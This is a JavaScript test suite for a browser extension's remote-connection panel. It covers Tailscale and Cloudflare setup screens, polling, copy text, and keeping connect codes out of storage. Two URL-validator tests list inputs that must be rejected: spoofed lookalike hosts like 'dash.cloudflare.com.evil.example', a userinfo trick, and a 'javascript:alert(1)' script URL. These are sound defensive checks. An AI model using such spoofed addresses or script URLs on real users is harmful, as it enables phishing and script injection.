	assert.equal(remoteFlowFor({ ...base, route: "remote", remoteKind: "cloudflare", publicUrl: "https://p.example.com" }), true);
	assert.equal(remoteFlowFor({ ...base, route: "remote", remoteKind: "custom", publicUrl: "https://p.example.com" }), false);
	assert.equal(remoteFlowFor({ ...base, route: "hub", publicUrl: "https://hub.example.com" }), false);
	assert.equal(remoteFlowFor({ ...base, route: "link" }), false);
	assert.equal(remoteFlowFor({ ...base, route: "none", problem: "remote.json is unreadable." }), false);
	const flow = read("src/dialogs/RemoteFlow.ts");
	assert.match(flow, /placeholder="polycarp\.yourdomain\.com"/);
	assert.match(flow, /<span>Address<\/span>/);
	assert.match(flow, /aria-live="polite" data-tunnel-steps/);
	assert.match(read("src/dialogs/ConnectTab.ts"), /<tabkyra-remote-flow \.status=\$\{s\}/);
});

test("the panel opens only https dash.cloudflare.com sign-in addresses", async () => {
	const { safeSignInUrl, parseTunnelProgress } = await import("../src/connect/format.ts");
	const good = "https://dash.cloudflare.com/argotunnel?aud=&callback=x";
	assert.equal(safeSignInUrl(good), good);
	for (const bad of ["http://dash.cloudflare.com/x", "https://dash.cloudflare.com.evil.example/x", "https://evil.example/", "https://u@dash.cloudflare.com/x", "https://dash.cloudflare.com:444/x", "javascript:alert(1)", "chrome://settings", "", 5, undefined]) {
		assert.equal(safeSignInUrl(bad), undefined, String(bad));
	}
	// A progress frame with a bad address loses the address; unknown steps and states are dropped.
	assert.deepEqual(parseTunnelProgress({ step: "signin", state: "waiting", url: "https://evil.example/" }), { step: "signin", state: "waiting" });
	assert.equal(parseTunnelProgress({ step: "signin", state: "waiting", url: good }).url, good);
	assert.equal(parseTunnelProgress({ step: "nope", state: "done" }), undefined);
	assert.equal(parseTunnelProgress({ step: "check", state: "weird" }), undefined);
	const flow = read("src/dialogs/RemoteFlow.ts");
	assert.match(flow, /view\.state === "waiting" \? safeSignInUrl\(view\.url\) : undefined;\s*if \(url && !signInOpened\)/);
	// Every tab the flow opens goes through openTab, and every openTab gets a checked address.
	for (const m of flow.matchAll(/this\.openTab\(([^)]*)\)/g)) assert.ok(["safe", "url"].includes(m[1]), m[0]);
	assert.equal((flow.match(/chrome\.tabs\.create/g) ?? []).length, 1);
});

// ---------- Use Polycarp from Claude, ChatGPT and Grok (remote-copy.ts, remote-flow.ts, RemoteFlow.ts) ----------

const STATES = ["tailscale_missing", "tailscale_signed_out", "funnel_not_allowed", "funnel_closed", "cloudflared_missing", "tailnet_lock", "port_busy", "ready", "on", "no_browser_connected", "problem"];
const PROBLEMS = ["launcher", "hub", "service", "serve", "funnel", "config", "cloudflare_login", "cloudflare_name", "cloudflare_zone", "cloudflare_dns", "cloudflare_tunnel", "connect_code", "tailscale_operator", "dns", "tls", "resource_metadata", "auth_metadata", "auth_challenge", "streaming", "not_set_up"];
const OLD_GENERIC = [/something is not working/i, /something went wrong/i, /couldn't finish/i, /an error occurred/i];
const status = (over = {}) => ({ route: "none", passcodeSet: false, theme: { preset: "default" }, ...over });

test("every helper state and problem code has its own sentence and one action, never a generic one", async () => {
	const { stepCopy, STEP_COPY } = await import("../src/connect/remote-copy.ts");
	const answers = [
		...STATES.filter((s) => s !== "problem" && s !== "port_busy").map((state) => ({ state, message: "helper words" })),
		{ state: "port_busy", code: "tailscale_port", message: "x" },
		{ state: "port_busy", code: "local_port", message: "x" },
		{ state: "cloudflared_missing", message: "x", next: { kind: "run_command", command: "polycarp remote setup --cloudflare p.example.com --yes" } },
		...PROBLEMS.map((code) => ({ state: "problem", code, message: "helper words" })),
		{ state: "problem", code: "cloudflare_dns", message: "x", next: { kind: "choose_name" } },
	];
	const bodies = new Set();
	for (const a of answers) {
		const copy = stepCopy(a);
		const label = `${a.state}/${a.code ?? ""}/${a.next?.kind ?? ""}`;
		assert.notEqual(copy.key, "unknown", label);
		assert.ok(copy.title && copy.body, label);
		assert.notEqual(copy.body, "helper words", `${label} shows its own sentence, not the helper's`);
		for (const g of OLD_GENERIC) assert.doesNotMatch(`${copy.title} ${copy.body}`, g, label);
		if (!["on", "no_browser_connected"].includes(copy.key)) assert.ok(copy.action?.label, `${label} has one action`);
		bodies.add(copy.body);
	}
	// Distinct problems read differently: no two keys share a body.
	const keys = Object.keys(STEP_COPY).filter((k) => k !== "unknown");
	assert.equal(new Set(keys.map((k) => STEP_COPY[k].body)).size, keys.length);
	// Unknown: the helper's own message, not a stock sentence.
	assert.equal(stepCopy({ state: "brand_new_state", message: "Tailscale 2.0 said no." }).body, "Tailscale 2.0 said no.");
	assert.equal(stepCopy({ state: "problem", code: "brand_new_code", message: "New words." }).body, "New words.");
});

test("each next.kind the helper sends draws its sentence and its button", async () => {
	const { flowScreen } = await import("../src/connect/remote-flow.ts");
	const cases = [
		[{ state: "tailscale_missing", message: "", next: { kind: "install", url: "https://tailscale.com/download/mac" } }, "Get Tailscale", "open_url"],
		[{ state: "tailscale_signed_out", message: "", next: { kind: "sign_in", command: "tailscale up" } }, "Copy the command", "copy_command"],
		[{ state: "funnel_not_allowed", message: "", next: { kind: "open_page", url: "https://login.tailscale.com/f/funnel?node=x" } }, "Open Tailscale's page", "open_url"],
		// Nothing saved yet, so nothing retries it: the command is drawn and the button checks again (first-F2, round 2).
		[{ state: "problem", code: "tailscale_operator", message: "", next: { kind: "run_command", command: "sudo tailscale set --operator=$USER" } }, "Check again", "open_funnel"],
		[{ state: "problem", code: "cloudflare_dns", message: "", next: { kind: "choose_name" } }, "Turn on", "turn_on"],
		[{ state: "ready", message: "" }, "Turn on", "turn_on"],
	];
	for (const [answer, label, kind] of cases) {
		const screen = flowScreen({ status: status(), remote: answer, chosen: "tailscale" });
		assert.equal(screen.kind, "step", answer.state);
		assert.equal(screen.copy.action.label, label, answer.state);
		assert.equal(screen.copy.action.kind, kind, answer.state);
	}
	// add_connector is the result itself.
	const on = { state: "on", message: "", connectorUrl: "https://m.ts.net:8443/mcp", next: { kind: "add_connector" } };
	assert.equal(flowScreen({ status: status(), run: on }).kind, "result");
	// The step draws the command the helper named, and opens only Tailscale's or Cloudflare's pages.
	const flow = read("src/dialogs/RemoteFlow.ts");
	assert.match(flow, /action\?\.kind === "copy_command" \|\| copy\.key === "tailscale_operator_check" \? answer\.next\?\.command/);
	const { safeHelpUrl } = await import("../src/connect/format.ts");
	assert.equal(safeHelpUrl("https://login.tailscale.com/f/funnel?node=x"), "https://login.tailscale.com/f/funnel?node=x");
	for (const bad of ["http://tailscale.com/", "https://tailscale.com.evil.example/", "https://u@tailscale.com/", "https://evil.example/", "javascript:alert(1)", 3]) assert.equal(safeHelpUrl(bad), undefined, String(bad));
});

test("the flow advances by itself: signing in, allowing Funnel and DNS all poll, and nothing asks for a try-again press", async () => {
	const { flowScreen, pollFor, settleRun, STATE_POLL_MS, FUNNEL_POLL_MS } = await import("../src/connect/remote-flow.ts");
	const routes = { tailscale: { installed: true, signedIn: false }, cloudflare: { installed: false, signedIn: false } };
	// Choose: Tailscale is recommended when it is installed.
	const choose = flowScreen({ status: status(), remote: { state: "tailscale_signed_out", message: "", routes } });
	assert.equal(choose.kind, "choose");
	assert.equal(choose.recommended, "tailscale");
	assert.equal(flowScreen({ status: status(), remote: { state: "tailscale_missing", message: "", routes: { ...routes, tailscale: { installed: false, signedIn: false } } } }).recommended, undefined);
	// Signed out -> polls -> the next state answers -> Ready, with no press in between.
	const input = { status: status(), chosen: "tailscale", remote: { state: "tailscale_signed_out", message: "", next: { kind: "sign_in", command: "tailscale up" } } };
	const s1 = flowScreen(input);
	assert.equal(s1.copy.key, "tailscale_signed_out");
	assert.equal(s1.step, 2);
	assert.deepEqual(pollFor(s1, input), { method: "remoteState", everyMs: STATE_POLL_MS });
	const later = { ...input, remote: { state: "ready", message: "" } };
	const s2 = flowScreen(later);
	assert.equal(s2.copy.key, "ready");
	assert.equal(s2.step, 3);
	// Funnel not allowed yet: the panel retries opening Funnel by itself, and the "on" answer is the result.
	const remote = status({ route: "remote", remoteKind: "funnel", publicUrl: "https://m.ts.net:8443" });
	const refused = { state: "funnel_not_allowed", message: "", next: { kind: "open_page", url: "https://login.tailscale.com/f/funnel?node=x" } };
	const waiting = { status: remote, remote: { state: "funnel_closed", message: "" }, run: refused };
	const s3 = flowScreen(waiting);
	assert.equal(s3.copy.key, "funnel_not_allowed");
	assert.deepEqual(pollFor(s3, waiting), { method: "remoteFunnel", everyMs: FUNNEL_POLL_MS });
	assert.equal(settleRun(refused, waiting.remote, remote), refused, "a status poll doesn't drop the refusal");
	const done = flowScreen({ ...waiting, run: { state: "on", message: "", connectorUrl: "https://m.ts.net:8443/mcp" } });
	assert.equal(done.kind, "result");
	assert.equal(done.connectorUrl, "https://m.ts.net:8443/mcp");
	// A new address still spreading through DNS checks again by itself.
	const dns = flowScreen({ status: remote, remote: { state: "problem", code: "dns", message: "" } });
	assert.equal(dns.kind, "result");
	assert.equal(pollFor(dns, { status: remote }).method, "remoteTest");
	// No step's button is a bare "try again" for something that resolves by itself.
	const { STEP_COPY } = await import("../src/connect/remote-copy.ts");
	for (const [k, v] of Object.entries(STEP_COPY)) if (v.waits) assert.notEqual(v.action?.kind, "try_again", k);
	assert.doesNotMatch(read("src/connect/remote-copy.ts"), /I've allowed it/);
	// The component gives up retrying after ten minutes, and the button still opens Funnel again.
	assert.match(read("src/connect/remote-flow.ts"), /FUNNEL_RETRY_FOR_MS = 10 \* 60_000/);
});

test("signing in or a Tailnet Lock refusal ends when the state moves on, and Use Cloudflare switches the form in", async () => {
	const { flowScreen, settleRun } = await import("../src/connect/remote-flow.ts");
	const run = { state: "tailscale_signed_out", message: "" };
	assert.equal(settleRun(run, { state: "ready", message: "" }, status()), undefined);
	assert.equal(settleRun(run, { state: "tailscale_signed_out", message: "" }, status()), run);
	const funnel = status({ route: "remote", remoteKind: "funnel", publicUrl: "https://m.ts.net:8443" });
	assert.equal(flowScreen({ status: funnel, remote: { state: "tailnet_lock", message: "" } }).copy.key, "tailnet_lock");
	assert.equal(flowScreen({ status: funnel, remote: { state: "tailnet_lock", message: "" }, chosen: "cloudflare" }).kind, "cloudflare");
	assert.equal(flowScreen({ status: status(), chosen: "cloudflare" }).kind, "cloudflare");
	assert.equal(flowScreen({ status: status(), busy: "setup" }).copy.key, "turning_on");
});

test("the result screen shows the address, the code with a countdown and New code, the three assistants, and no passcode", async () => {
	const { ASSISTANT_STEPS, RESULT_COPY } = await import("../src/connect/remote-copy.ts");
	const flow = read("src/dialogs/RemoteFlow.ts");
	const result = flow.slice(flow.indexOf("private result("), flow.indexOf("protected override updated"));
	for (const needle of ["ASSISTANT_STEPS.map", "APPROVAL_STEP", "RESULT_COPY.addressStep", "RESULT_COPY.codeStep", 'role="timer"', "RESULT_COPY.expiresIn", "RESULT_COPY.newCode", "RESULT_COPY.noPasscode", "data-connect-code", "data-checks", "canRepair"]) {
		assert.ok(result.includes(needle), needle);
	}
	assert.deepEqual(ASSISTANT_STEPS.map((a) => a.name), ["claude.ai", "ChatGPT", "grok.com"]);
	assert.match(RESULT_COPY.noPasscode, /No passcode was made here/);
	// Repair shows only when this helper has `remote fix` (feature-detected) with actions and a check really failed.
	assert.match(read("src/connect/remote-flow.ts"), /repair: \(failed\.length > 0 \|\| gaveUp\) && repairAvailable\(input\.fix\)/);
	// The panel setups make no passcode (D33), so nothing about one can reach the page.
	assert.match(read("cli/src/remote-panel.ts"), /passcode: false/);
	assert.doesNotMatch(flow, /\.passcode\b/);
});

test("the connect code is kept in memory only: no storage writes, and it is dropped when the view closes", () => {
	for (const f of ["src/dialogs/RemoteFlow.ts", "src/connect/remote-flow.ts", "src/connect/remote-copy.ts", "src/dialogs/ConnectTab.ts"]) {
		// Code only: the doc comments name these APIs to say they aren't used.
		const src = read(f).replace(/\/\*[\s\S]*?\*\//g, "").replace(/^\s*\/\/.*$/gm, "");
		assert.doesNotMatch(src, /chrome\.storage|localStorage|sessionStorage|indexedDB|console\.(log|info|debug|warn|error)/, f);
	}
	const flow = read("src/dialogs/RemoteFlow.ts");
	assert.match(flow, /disconnectedCallback\(\): void \{[^}]*this\.code = undefined;\s*this\.run = undefined;/s);
	assert.match(read("src/dialogs/ConnectTab.ts"), /disconnectedCallback\(\): void \{[^}]*this\.approval = undefined;/s);
});

test("the unsourced claim about claude.ai and Funnel addresses is gone everywhere; the Tailnet Lock reason (D30) replaces it", () => {
	const claim = /claude\.ai often can't reach Tailscale Funnel/i;
	for (const f of ["src/dialogs/ConnectTab.ts", "src/dialogs/RemoteFlow.ts", "src/connect/remote-copy.ts", "src/connect/format.ts", "docs/remote.md", "../spaces/Sources/BaneySpacesCore/BrowserRemote.swift", "../spaces/Sources/BaneySpaces/BrowserRemoteView.swift"]) {
		assert.doesNotMatch(read(f), claim, f);
	}
	assert.match(read("src/connect/remote-copy.ts"), /Tailnet Lock turned on, and Funnel doesn't work with it/);
});

test("a quiet poll changes nothing on screen (no jitter): equal answers are not assigned", async () => {
	const { sameAnswer } = await import("../src/connect/remote-flow.ts");
	assert.equal(sameAnswer({ state: "ready", message: "" }, { state: "ready", message: "" }), true);
	assert.equal(sameAnswer({ state: "ready", message: "" }, { state: "on", message: "" }), false);
	const flow = read("src/dialogs/RemoteFlow.ts");
	assert.match(flow, /if \(!sameAnswer\(answer, this\.remote\)\) this\.remote = answer;/);
	// The countdown re-renders only when its text changes, and the wait line keeps its height when empty.
	assert.match(flow, /countdown\(this\.code\.expiresAt, this\.now\) !== countdown\(this\.code\.expiresAt, now\)/);
	assert.match(flow, /min-h-4 text-xs text-muted-foreground" role="status"/);
});
